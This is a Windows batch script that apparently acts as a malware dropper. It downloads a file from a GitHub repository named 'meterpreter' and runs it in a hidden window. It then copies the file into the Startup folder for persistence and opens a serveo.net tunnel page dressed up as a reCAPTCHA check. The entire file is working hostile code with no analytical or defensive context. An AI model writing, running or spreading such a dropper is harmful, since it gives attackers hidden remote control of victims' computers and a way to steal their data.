@echo off
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat -o "%temp%\start.bat"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\start.bat\" -WindowStyle Hidden"
move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start https://574ce31bfcc3b63df4a992a607e7401a.serveo.net/reCaPTCHA/r.html

